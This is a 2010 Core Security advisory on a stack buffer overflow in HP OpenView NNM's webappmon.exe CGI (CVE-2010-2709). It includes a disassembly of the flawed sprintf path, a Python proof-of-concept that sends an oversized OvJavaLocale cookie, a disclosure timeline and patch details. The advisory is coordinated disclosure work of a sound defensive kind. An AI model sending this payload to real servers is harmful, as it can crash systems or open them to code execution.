@@ -1,0 +1,155 @@
+HP OPENVIEW NNM OVJAVALOCALE BUFFER OVERFLOW VULNERABILITY
+1. ADVISORY INFORMATION
+
+Title: HP OpenView NNM OvJavaLocale Buffer Overflow Vulnerability
+Advisory Id: CORE-2010-0608
+Advisory URL: http://www.coresecurity.com/content/hp-nnm-ovjavalocale-buffer-overflow
+Date published: 2010-08-03
+Date of last update: 2010-08-03
+Vendors contacted: HP
+Release mode: Coordinated release
+
+2. VULNERABILITY INFORMATION
+
+Class: Buffer overflow [CWE-119]
+Impact: Code execution
+Remotely Exploitable: Yes
+Locally Exploitable: No
+CVE Name: CVE-2010-2709
+Bugtraq ID: N/A
+
+3. VULNERABILITY DESCRIPTION
+
+There is a buffer overflow vulnerability in the webappmon.exe CGI application included with HP OpenView NNM[1]. This bug can be exploited by sending a cookie header with a maliciously crafted OvJavaLocale value. Code execution is likely achievable in a reliable way.
+
+4. VULNERABLE PACKAGES
+
+OpenView NNM v.7.53
+Older versions are probably affected too, but they were not checked.
+5. NON-VULNERABLE PACKAGES
+
+OpenView NNM v.7.53 with latest patches:
+HP-UX (IA): PHSS_40708 or subsequent,
+HP-UX (PA): PHSS_40707 or subsequent,
+Linux RedHatAS 2.1: LXOV_00103 or subsequent,
+Linux RedHat4AS-x86_64: XOV_00104 or subsequent,
+Solaris PSOV_03527: or subsequent,
+Windows: NNM_01203 or subsequent.
+6. VENDOR INFORMATION, SOLUTIONS AND WORKAROUNDS
+
+Upgrade to the latest version of OpenView NNM, available from HP. More information can be found on HP's security bulletin HPSBMA02563 SSRT100165 rev.1: http://www.securityfocus.com/archive/1/512822
+
+7. CREDITS
+
+This vulnerability was discovered and researched by Nahuel Riva from Core Security Technologies. The publication of this advisory was coordinated by Pedro Varangot.
+
+8. TECHNICAL DESCRIPTION / PROOF OF CONCEPT CODE
+
+HP OpenView NNM OvJavaLocale Buffer Overflow Vulnerability HP NNM bundles with a CGI script called webappmon.exe. This application receives its parameters over HTTP POST and GET. A buffer overflow occurs when invoking it, for example with a GET query, and maliciously setting cookies by sending the following HTTP HEADER:
+
+'Cookie: OvJavaLocale=%s.Cp1252;' % ("A" * 10000)
+
+To parse this header the OvWwwDebug function from ovwww.dll is called:
+
+5A307477 OvWwwDebug       55              PUSH EBP
+5A307478                  8BEC            MOV EBP,ESP
+5A30747A                  B8 20140000     MOV EAX,1420
+5A30747F                  E8 CC850000     CALL ovwww.5A30FA50
+5A307484                  33C0            XOR EAX,EAX
+5A307486                  A0 543F325A     MOV AL,BYTE PTR DS:[5A323F54]
+5A30748B                  83E0 01         AND EAX,1
+5A30748E                  85C0            TEST EAX,EAX
+5A307490                  75 22           JNZ SHORT ovwww.5A3074B4
+
+This function calls a sprintf_new() wrapper from ov.dll:
+
+5A307521                  8B8D E8EBFFFF   MOV ECX,DWORD PTR SS:[EBP-1418]
+5A307527                  51              PUSH ECX
+5A307528                  8B55 08         MOV EDX,DWORD PTR SS:[EBP+8]
+5A30752B                  52              PUSH EDX
+5A30752C                  8D85 00ECFFFF   LEA EAX,DWORD PTR SS:[EBP-1400]
+5A307532                  50              PUSH EAX
+5A307533                  FF15 9001315A   CALL DWORD PTR DS:[<&ov.sprintf_new>]    ; ov.sprintf_new
+
+Which calls sprintf() with incorrectly passed and sanitized parameters:
+
+5A028409 sprintf_new    /$  55            PUSH EBP
+5A02840A                |.  8BEC          MOV EBP,ESP
+5A02840C                |.  B8 10000100   MOV EAX,10010                            ;  UNICODE "PROFILE=C:\Documents and Settings\All Users"
+5A028411                |.  E8 3A650000   CALL ov.5A02E950
+[...]
+5A02854E                |.  51            PUSH ECX                                 ; /<%s>
+5A02854F                |.  68 6441045A   PUSH ov.5A044164                         ; |format = "%s"
+5A028554                |.  8B55 08       MOV EDX,DWORD PTR SS:[EBP+8]             ; |
+5A028557                |.  52            PUSH EDX                                 ; |s
+5A028558                |.  FF15 C002035A CALL DWORD PTR DS:[<&MSVCRT.sprintf>]    ; \sprintf
+[...]
+
+There format equals HTTP_COOKIE=%s. This triggers a buffer overflow that overwrites the functions return address and exception handler on the stack.
+
+The following Python code triggers the buffer overflow:
+
+
+import socket
+
+ip = "192.168.1.0"
+port = 80
+
+target = (ip, port)
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(target)
+
+headers  = 'GET /OvCgi/webappmon.exe?ins=nowait&sel=%s&app%s=&act%s=&arg=&help=&cache=1600 HTTP/1.1\r\n' % ("A", "B", "C")
+headers += 'Host: %s\r\n' % ip
+headers += 'User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)\r\n'
+headers += 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n'
+headers += 'Accept-Language: en-us,en;q=0.5\r\n'
+headers += 'Accept-Encoding: gzip,deflate\r\n'
+headers += 'Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n'
+headers += 'Keep-Alive: 300\r\n'
+headers += 'Connection: keep-alive\r\n'
+headers += 'Cookie: OvJavaLocale=%s.Cp1252;' % ("A" * 10000) + 'OvWebSession=14150:AnyUser%3a\r\n'
+headers += 'Cache-Control: max-age=0\r\n'
+headers += '\r\n'
+
+s.sendall(str(headers))
+
+
+9. REPORT TIMELINE
+
+2010-06-22: Core Security Technologies contacts HP Security Alert team, offering them a draft copy of this advisory either encrypted or in plaintext.
+2010-06-22: HP replies with proper PGP keys for encrypted communication.
+2010-06-24: Core Security Technologies sends an encrypted draft of this advisory to HP.
+2010-06-25: HP replies stating that they were not able to reproduce this vulnerability using the latest patches for NNM 7.53.
+2010-06-28: Core Security Technologies asks for the latest patches for Windows in order to double-verify what HP claims.
+2010-06-30: HP agrees to supply patches to Core Security Technologies with the condition that they are not redistributed.
+2010-06-30: Core Security Technologies agrees to HPs conditions of not reditributting patches and confirms that they will also be used internally and for vulnerability research purposes.
+2010-06-30: HP uploads the patches to a secured FTP server for Core Security Technologies to download.
+2010-07-05: Core Security Technologies informs HP that further patches are needed in order to correctly install the supplied ones.
+2010-07-06: HP uploads the newly needed patches to a secured FTP server for Core Security Technologies to download.
+2010-07-08: Core Security Technologies informs HP that the new patches require yet another patch, and asks for confirmation that no more patches will be needed after this one.
+2010-07-08: HP uploads the yet another needed patches to a secured FTP server for Core Security Technologies to download. It states that they beleive no more patches will be needed.
+2010-07-26: Core Security Technologies informs HP that the vulnerability reported is correctly patched, and that they had found no vulnerabilities related to the originally reported one on the patched version. Core Security Technologies also asks for the CVE number assigned to the vulnerability when it was initially found and patched, if there was any.
+2010-07-26: HP informs Core Security Technologies that since this vulnerability was fixed without acknowledgment, they'll proceed to publish a security bulletin, and asks for clarification on proper credits to include in an acknowledgement in the bulletin.
+2010-07-26: Core Security Technologies replies informing about proper credits, and states that if HP publishes a security then this advisory will be published.
+2010-08-03: HP publishes HPSBMA02563 SSRT100165 rev.1 security bulletin.
+2010-08-03: Core Security Technologies publishes advisory CORE-2010-0608.
+10. REFERENCES
+
+[1] HP Network Node Manager (NNM) Advanced Edition software
+11. ABOUT CORELABS
+
+CoreLabs, the research center of Core Security Technologies, is charged with anticipating the future needs and requirements for information security technologies. We conduct our research in several important areas of computer security including system vulnerabilities, cyber attack planning and simulation, source code auditing, and cryptography. Our results include problem formalization, identification of vulnerabilities, novel solutions and prototypes for new technologies. CoreLabs regularly publishes security advisories, technical papers, project information and shared software tools for public use at: http://corelabs.coresecurity.com/.
+
+12. ABOUT CORE SECURITY TECHNOLOGIES
+
+Core Security Technologies develops strategic solutions that help security-conscious organizations worldwide develop and maintain a proactive process for securing their networks. The company's flagship product, CORE IMPACT, is the most comprehensive product for performing enterprise security assurance testing. CORE IMPACT evaluates network, endpoint and end-user vulnerabilities and identifies what resources are exposed. It enables organizations to determine if current security investments are detecting and preventing attacks. Core Security Technologies augments its leading technology solution with world-class security consulting services, including penetration testing and software security auditing. Based in Boston, MA and Buenos Aires, Argentina, Core Security Technologies can be reached at 617-399-6980 or on the Web at http://www.coresecurity.com.
+
+13. DISCLAIMER
+
+The contents of this advisory are copyright (c) 2010 Core Security Technologies and (c) 2010 CoreLabs, and are licensed under a Creative Commons Attribution Non-Commercial Share-Alike 3.0 (United States) Licence: http://creativecommons.org/licenses/by-nc-sa/3.0/us/
+
+14. PGP/GPG KEYS
+
+This advisory has been signed with the GPG key of Core Security Technologies advisories team, which is available for download at http://www.coresecurity.com/files/attachments/core_security_advisories.asc.
